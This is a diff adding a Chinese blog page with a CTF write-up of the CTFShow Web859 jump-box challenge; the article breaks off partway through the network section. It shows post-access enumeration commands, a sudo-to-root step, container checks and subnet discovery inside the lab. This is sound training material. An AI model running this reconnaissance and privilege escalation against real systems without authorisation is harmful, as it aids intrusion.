@@ -1,0 +1,1260 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CTFShow入门内网渗透 | choco</title><meta name="author" content="Teaaa"><meta name="copyright" content="Teaaa"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="说白了就是 Web859_有跳板机，因为得学一下内网的东西，其实计网课也自学了一些基础内容，但不够深刻，现在就以学长们都在分析的这道题入手吧。 在前面学nmap使用的时候为了测试也提到过这道题，现在也刚好完善一下。也写了很多对解题来说没必要的系统命令，主要还是为了了解熟悉一下命令吧。 还有很多看到啥写啥的基础内容。  值得一提的是，这个容器我测试反复开开关了好几次，每次的SSH端口、内网 Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFShow入门内网渗透">
+<meta property="og:url" content="http://example.com/web859/index.html">
+<meta property="og:site_name" content="choco">
+<meta property="og:description" content="说白了就是 Web859_有跳板机，因为得学一下内网的东西，其实计网课也自学了一些基础内容，但不够深刻，现在就以学长们都在分析的这道题入手吧。 在前面学nmap使用的时候为了测试也提到过这道题，现在也刚好完善一下。也写了很多对解题来说没必要的系统命令，主要还是为了了解熟悉一下命令吧。 还有很多看到啥写啥的基础内容。  值得一提的是，这个容器我测试反复开开关了好几次，每次的SSH端口、内网 Web">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/head.jpg">
+<meta property="article:published_time" content="2026-11-22T05:58:14.580Z">
+<meta property="article:modified_time" content="2026-11-22T13:55:19.619Z">
+<meta property="article:author" content="Teaaa">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/head.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTFShow入门内网渗透",
+  "url": "http://example.com/web859/",
+  "image": "http://example.com/img/head.jpg",
+  "datePublished": "2026-11-22T05:58:14.580Z",
+  "dateModified": "2026-11-22T13:55:19.619Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Teaaa",
+      "url": "http://www.baidu.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/nailong.jpg"><link rel="canonical" href="http://example.com/web859/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.1.260810"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        try {
+          const data = { value }
+
+          if (ttl != null) {
+            data.expiry = Date.now() + ttl * 86400000
+          }
+
+          localStorage.setItem(key, JSON.stringify(data))
+        } catch (e) {
+          console.error(e)
+        }
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":-1,"unescape":false,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CTFShow入门内网渗透',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>
+  /* 明亮模式 */
+  #body-wrap #recent-posts > .recent-post-item,
+  #body-wrap .recent-post-item,
+  #body-wrap #aside-content .card-widget,
+  #body-wrap .layout > div:first-child:not(.recent-posts),
+  #body-wrap #nav .menus_items .menus_item .menus_item_child,
+  #body-wrap #pagination .page-number:not(.current),
+  #body-wrap #pagination .extend {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(2px);
+      -webkit-backdrop-filter: blur(2px);
+      border: 1px solid rgba(255, 255, 255, 0.85);
+      box-shadow: 0 8px 16px -4px rgba(138, 138, 138, 0.15);
+      transition: background 0.3s ease, border 0.3s ease, box-shadow 0.3s ease;
+  }
+  #body-wrap #pagination .page-number:not(.current):hover,
+  #body-wrap #pagination .extend:hover {
+      background: #ff7142d2;
+      border-color: #ff7142d2;
+      color: #fff;
+  }
+  /* 夜间模式 */
+  html[data-theme="dark"] #body-wrap #recent-posts > .recent-post-item,
+  html[data-theme="dark"] #body-wrap .recent-post-item,
+  html[data-theme="dark"] #body-wrap #aside-content .card-widget,
+  html[data-theme="dark"] #body-wrap .layout > div:first-child:not(.recent-posts),
+  html[data-theme="dark"] #body-wrap #nav .menus_items .menus_item .menus_item_child,
+  html[data-theme="dark"] #body-wrap #pagination .page-number:not(.current),
+  html[data-theme="dark"] #body-wrap #pagination .extend {
+      background: rgba(30, 30, 30, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 8px 16px -4px rgba(0, 0, 0, 0.2);
+  }
+  /*亮色模式强制文字颜色*/
+  .recent-post-item .article-title{
+    color:#111 !important;
+  }
+  .recent-post-item .article-meta-wrap,
+  .recent-post-item .content{
+      color:#222 !important;
+  }
+  /*夜间模式文字颜色*/
+  html[data-theme="dark"] .recent-post-item .article-title{
+    color:#f1f1f1 !important;
+  }
+  html[data-theme="dark"] .recent-post-item .article-meta-wrap,
+  html[data-theme="dark"] .recent-post-item .content{
+    color:#dddddd !important;
+  }
+  
+</style>
+<meta name="generator" content="Hexo 7.3.0"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/dahai.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://www.baidu.com"><i class="fa-fw fa fa-circle"></i><span> 虫洞</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/yuan.png" alt="Logo"><span class="site-name">choco</span></a><a class="nav-page-title" href="/"><span class="site-name">CTFShow入门内网渗透</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://www.baidu.com"><i class="fa-fw fa fa-circle"></i><span> 虫洞</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CTFShow入门内网渗透</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-22T05:58:14.580Z" title="发表于 2026-11-22 13:58:14">2026-11-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-22T13:55:19.619Z" title="更新于 2026-11-22 21:55:19">2026-11-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">10307</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>43 分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>说白了就是 <code>Web859_有跳板机</code>，因为得学一下内网的东西，其实计网课也自学了一些基础内容，但不够深刻，现在就以学长们都在分析的这道题入手吧。</p>
+<p>在前面学<code>nmap</code>使用的时候为了测试也提到过这道题，现在也刚好完善一下。也写了很多对解题来说没必要的系统命令，主要还是为了了解熟悉一下命令吧。</p>
+<p>还有很多看到啥写啥的基础内容。</p>
+<blockquote>
+<p>值得一提的是，这个容器我测试反复开开关了好几次，每次的SSH端口、内网 Web IP都不一样，所以不同地方的带IP的命令也会不一样，这个需要注意。</p>
+</blockquote>
+<h1 id="Web859"><a href="#Web859" class="headerlink" title="Web859"></a>Web859</h1><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><ul>
+<li>来自2023年2月的<code>RealWorldCTF</code>渗透赛环境</li>
+<li>需要本地<code>ssh</code> 链接题目给的地址和端口，作为<strong>攻击机</strong></li>
+<li>攻击机<strong>不出网</strong></li>
+<li>攻击机预置了某些工具，可以自己使用</li>
+<li>用户名是<code>ctfshow</code>密码也是<code>ctfshow</code></li>
+<li><code>ssh ctfshow@pwn.challenge.ctf.show -p28183</code></li>
+</ul>
+<hr>
+<h1 id="基础探测"><a href="#基础探测" class="headerlink" title="基础探测"></a>基础探测</h1><p>先提前看一下我们的攻击机环境：</p>
+<table>
+<thead>
+<tr>
+<th>项</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>系统</td>
+<td><code>Ubuntu 20.04.2 LTS</code> 容器，<code>hostname shell</code></td>
+</tr>
+<tr>
+<td>权限</td>
+<td><code>ctfshow</code> 在 <code>sudoers</code>：<code>(ALL:ALL) NOPASSWD: ALL</code> → 直接 root</td>
+</tr>
+<tr>
+<td>网络</td>
+<td><code>eth0 172.2.115.4/24</code>，无默认路由（真不出网）</td>
+</tr>
+<tr>
+<td>DNS</td>
+<td><code>127.0.0.11（Docker）</code>，外网解析失败</td>
+</tr>
+<tr>
+<td>资源</td>
+<td>8 核 &#x2F; 15G 内存 &#x2F; 251G 磁盘</td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="环境判断（决定工具能不能用）"><a href="#环境判断（决定工具能不能用）" class="headerlink" title="环境判断（决定工具能不能用）"></a>环境判断（决定工具能不能用）</h1><h2 id="基础权限相关"><a href="#基础权限相关" class="headerlink" title="基础权限相关"></a>基础权限相关</h2><p>先看看我是什么东西变的，权限信息，提权判断</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>                          <span class="comment"># uid=1000(ctfshow) gid=1000(ctfshow) groups=1000(ctfshow)</span></span><br><span class="line"><span class="built_in">whoami</span>; hostname            <span class="comment"># ctfshow / shell</span></span><br><span class="line"><span class="built_in">sudo</span> -n -l                  <span class="comment"># 核心：非交互查 sudo 权限</span></span><br><span class="line"><span class="built_in">groups</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><ul>
+<li><code>-n</code>：<code>non-interactive</code>，非交互模式，不弹出密码输入框。若需要则报错退出，不会等你输密码</li>
+<li><code>-l</code>：list，列出当前用户 sudo 允许执行的命令（就是查看 sudo 权限列表）</li>
+</ul>
+</blockquote>
+<p>关于权限实测输出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User ctfshow may run the following commands on shell:</span><br><span class="line">    (ALL : ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>sudo -n -l</code> 就决定了后面能不能跑 <code>raw socket</code> 扫描、能不能绑低端口，探测顺便完成了提权判断</p>
+<p>那么根据这里，这题 ALL 权限，可以：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> su</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>作用：用 sudo 权限执行 su 命令，切换到 root 用户</p>
+<p>  等价于：<code>sudo -i</code></p>
+</blockquote>
+</blockquote>
+<h2 id="系统状况"><a href="#系统状况" class="headerlink" title="系统状况"></a>系统状况</h2><blockquote>
+<p>目标：判断系统版本、CPU 架构、<code>glibc</code> 版本、是否 <code>docker</code> 容器、后台进程<br>用来决定 <code>exp</code>、工具、<code>payload</code> 能不能跑</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a; <span class="built_in">cat</span> /etc/os-release | <span class="built_in">head</span> -3</span><br><span class="line"><span class="built_in">uname</span> -m</span><br><span class="line">ldd --version | <span class="built_in">head</span> -1</span><br><span class="line"><span class="built_in">nproc</span>; free -m | <span class="built_in">head</span> -2; <span class="built_in">df</span> -h /</span><br></pre></td></tr></table></figure>
+
+<p>命令解读：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux shell 5.4.0-163-generic <span class="comment">#180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>uname -a</code>：打印内核完整信息 输出包含：内核版本、主机名、架构（x86_64 &#x2F;aarch64）、编译时间 用途：选内核漏洞 exp（脏牛、<code>pwnkit</code> 等）、匹配对应架构工具</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NAME=<span class="string">&quot;Ubuntu&quot;</span></span><br><span class="line">VERSION=<span class="string">&quot;20.04.2 LTS (Focal Fossa)&quot;</span></span><br><span class="line">ID=ubuntu</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>cat /etc/os-release | head -3</code>：读系统发行版信息 可以看到是 Ubuntu &#x2F; Debian &#x2F; CentOS，版本号 用途：不同发行版包管理器、文件路径、默认配置不一样；Ubuntu 和 Debian 内网题最多</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">uname</span> -m</span><br><span class="line">x86_64</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-m</code>：machine，只输出 CPU 架构 常见：<code>x86_64</code>（64 位 intel）、<code>i386</code>（32 位）、<code>aarch64</code>（arm）<br><strong>最关键</strong>：上传 <code>fscan</code>、<code>pspy</code>、<code>exp</code> 的时候必须选对应架构的二进制，下错直接执行报错</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd (Ubuntu GLIBC 2.31-0ubuntu9.2) 2.31</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>ldd</code> 是 <code>glibc</code> 的配套工具，用来查看动态链接库版本</li>
+<li>输出形如 <code>ldd (Ubuntu GLIBC 2.31-0ubuntu9.12) 2.31</code></li>
+<li>用途：<ol>
+<li>有些 <code>exp</code>、静态编译工具对 <code>glibc</code> 版本敏感；<code>glibc</code> 过低会报<code>version GLIBC_2.xx not found</code></li>
+<li>辅助确认系统版本：<code>glibc2.31</code> 基本对应 <code>Ubuntu20.04</code>，和本题匹配</li>
+</ol>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:          15483        4790        3561          73        7132       10290</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">overlay         251G  179G   62G  75% /</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>nproc</code>：输出可用 CPU 核心数，看资源，一般内网跳板不用管，辅助判断是不是资源受限容器</li>
+<li><code>free -m</code>：以 MB 为单位看内存</li>
+<li><code>df -h /</code>：看根分区磁盘，<code>-h</code>人性化可读 容器特征：根分区很小、<code>overlay</code> 文件系统</li>
+</ul>
+<h2 id="容器状况"><a href="#容器状况" class="headerlink" title="容器状况"></a>容器状况</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 内网靶场高频</span></span><br><span class="line"><span class="built_in">ls</span> -la /.dockerenv</span><br><span class="line"><span class="built_in">cat</span> /proc/1/cgroup | <span class="built_in">head</span> -3</span><br><span class="line"><span class="built_in">cat</span> /proc/1/comm</span><br><span class="line">ps aux | <span class="built_in">head</span> -15</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>/.dockerenv</code> 是 docker 容器标志性文件，宿主机<strong>没有这个文件</strong></li>
+<li>有这个文件 &#x3D; 确定是 docker 容器跳板；没有不代表一定不是（有些镜像会删掉）</li>
+<li>执行后：如果不报错、能看到文件 → 容器；<code>No such file</code> 大概率宿主机</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwxr-xr-x 1 root root 0 Nov 21 14:53 /.dockerenv</span><br></pre></td></tr></table></figure>
+
+<p><code>/proc</code> 是内核虚拟文件系统，<code>cgroup</code> 是容器资源隔离机制</p>
+<ul>
+<li>容器内：<code>cgroup</code> 路径会出现 <code>/docker/xxx</code>、<code>kubepods</code> 这类字符串</li>
+<li>宿主机：<code>cgroup</code> 路径一般没有 <code>docker</code> 标记</li>
+<li>补充：就算删了<code>.dockerenv</code>，<code>cgroup</code> 依然大概率暴露容器身份</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /proc/1/cgroup | <span class="built_in">head</span> -3</span><br><span class="line">12:memory:/docker/a183cec5ed34a67e636be035f70a3fdf7e6cbc7a9bd4c8c6be0dab1f231bee80</span><br><span class="line">11:rdma:/docker/a183cec5ed34a67e636be035f70a3fdf7e6cbc7a9bd4c8c6be0dab1f231bee80</span><br><span class="line">10:freezer:/docker/a183cec5ed34a67e636be035f70a3fdf7e6cbc7a9bd4c8c6be0dab1f231bee80</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>/proc/[pid]/comm</code> 代表这个进程的程序名</li>
+<li>PID&#x3D;1 是系统一号进程<ul>
+<li>宿主机正常：<code>systemd</code>（现代 Ubuntu&#x2F;CentOS）、<code>init</code></li>
+<li>docker 容器：经常是 <code>/bin/sh</code>、<code>bash</code>、<code>sshd</code>、<code>tail</code>，和本题一致：<code>/bin/sh</code></li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>本题 PID1 是 <code>/bin/sh -c /tmp/start.sh</code>，说明容器启动脚本是 <code>start.sh</code>，不是 <code>systemd</code>，<strong>没有 <code>systemd</code>、没有常规 <code>cron</code> 服务</strong>，直接排除很多提权思路（系统级 <code>cron</code>）</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /proc/1/comm</span><br><span class="line">sh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>列出所有进程，取前 15 条</li>
+<li>看有没有后台定时任务、隐藏进程、<code>redis/mysql</code> 等服务</li>
+<li>本题只看到 <code>sshd</code>、<code>tail</code>，没有其他业务进程，纯跳板，没有本地服务漏洞可以利用</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root           1  0.0  0.0   2608   468 ?        Ss   14:53   0:00 /bin/sh -c /tmp/start.sh</span><br><span class="line">root           6  0.0  0.0   3976  2680 ?        S    14:53   0:00 /bin/bash /tmp/start.sh</span><br><span class="line">root          13  0.0  0.0  12180  3396 ?        Ss   14:53   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups</span><br><span class="line">root          14  0.0  0.0   2544   528 ?        S    14:53   0:00 <span class="built_in">tail</span> -F /dev/null</span><br><span class="line">root        1143  0.0  0.0  13896  8908 ?        Ss   15:02   0:00 sshd: ctfshow [priv]</span><br><span class="line">ctfshow     1154  0.0  0.0  13896  5280 ?        S    15:02   0:00 sshd: ctfshow@pts/0</span><br><span class="line">ctfshow     1155  0.0  0.0   2608  1660 pts/0    Ss   15:02   0:00 -sh</span><br><span class="line">ctfshow     1229  0.0  0.0   7648  3148 pts/0    R+   15:51   0:00 ps aux</span><br><span class="line">ctfshow     1230  0.0  0.0   4272   588 pts/0    S+   15:51   0:00 <span class="built_in">head</span> -15</span><br></pre></td></tr></table></figure>
+
+
+
+<p>其实对于这道题，环境判断形同虚设，但针对其他时候了解一下可以快速缩小攻击面。</p>
+<hr>
+<h1 id="网络拓扑探测"><a href="#网络拓扑探测" class="headerlink" title="网络拓扑探测"></a>网络拓扑探测</h1><blockquote>
+<p>目标：<strong>搞清楚这台跳板在哪、能访问谁、谁能访问它、有没有网关、DNS、内网网段</strong>，用来决定扫描哪个网段、隧道怎么回连、能不能出网。</p>
+</blockquote>
+<p>前提：这台机器没有 <code>ip</code> 命令（<code>iproute2</code> 没装），所以全部用 <code>net-tools</code> 老工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br><span class="line">route -n</span><br><span class="line"><span class="built_in">cat</span> /etc/hosts</span><br><span class="line"><span class="built_in">cat</span> /etc/resolv.conf</span><br><span class="line"><span class="built_in">cat</span> /proc/net/arp</span><br><span class="line">netstat -tunlp</span><br><span class="line"><span class="built_in">env</span> | grep SSH</span><br></pre></td></tr></table></figure>
+
+<h2 id="命令解读："><a href="#命令解读：" class="headerlink" title="命令解读："></a>命令解读：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ifconfig -a</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1450</span><br><span class="line">        inet 172.2.152.4  netmask 255.255.255.0  broadcast 172.2.152.255</span><br><span class="line">        ether 02:42:ac:02:98:04  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 1468  bytes 145577 (145.5 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 2098  bytes 201891 (201.8 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 249  bytes 27832 (27.8 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 249  bytes 27832 (27.8 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>ifconfig</code>：网卡信息；<code>-a</code> &#x3D; <strong>显示所有网卡，包括没启用的网卡</strong>（不加 - a 只看 up 的）</li>
+<li>输出重点看：<ol>
+<li>网卡名：eth0、ens33 这类内网网卡；lo 本地回环 127.0.0.1</li>
+<li><code>inet</code>：IP 地址 + 子网掩码（<code>172.2.152.4/24</code>），直接拿到内网网段</li>
+<li><code>inet6</code>：IPv6，CTF 内网题基本忽略</li>
+</ol>
+</li>
+<li>做题用途：确定要扫描的网段，比如拿到 <code>172.2.152.4</code>，就扫 <code>172.2.152.0/24</code></li>
